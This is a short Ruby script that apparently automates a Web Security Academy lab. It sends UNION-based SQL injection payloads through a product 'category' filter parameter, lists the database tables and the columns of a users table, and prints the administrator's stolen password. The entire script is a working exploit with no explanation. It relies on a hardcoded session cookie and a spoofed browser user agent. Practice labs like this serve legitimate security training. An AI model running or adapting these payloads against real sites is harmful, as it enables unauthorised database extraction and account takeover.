require 'http'
require 'nokogiri'

tn = [] 
cn = [] 
cr = []

url = "https://0ab2002404cbe4ba8081a83500ee00c8.web-security-academy.net/filter"

client = HTTP.headers(
	"User-Agent"=>"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36"
	)
	.cookies(
		:session => "vkzFJrCNhuafZOSDi6g6dyinW531AvRd"
	)

# Get the table names
payload1 = "' UNION SELECT table_name,null FROM information_schema.tables-- -"
req1 = client.get url,:params => {:category => "Pets#{payload1}"}
resp1 = Nokogiri.parse req1.body.to_s
resp1.search('tr').each {|d| tn << d.elements.text if d.elements.text.start_with? "user"}
tntq = 'users_neyxpj'

if !tn.include?tntq
	puts "Table does not exist: "
	exit
end

# Get the column names
payload2 = "' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='#{tntq}'-- -"
req2 = client.get url,:params => {:category => "Pets#{payload2}"}
resp2 = Nokogiri.parse req2.body.to_s
resp2.search('tr').each {|d| cn << d.elements.text if d.elements.text.start_with? "user","passwd","password"}

# Get the data 
cn1 = cn[0]
cn2 = cn[1]
payload3 = "' UNION SELECT #{cn1},#{cn2} FROM #{tntq}-- -"
req3 = client.get url,:params => {:category => "Pets#{payload3}"}
resp3 = Nokogiri.parse req3.body.to_s
resp3.search('tr').each {|d| cr << d.elements.text if d.elements.text.include?"administrator"}
puts "Creds => administrator:#{cr[0].split('administrator')[0]}"
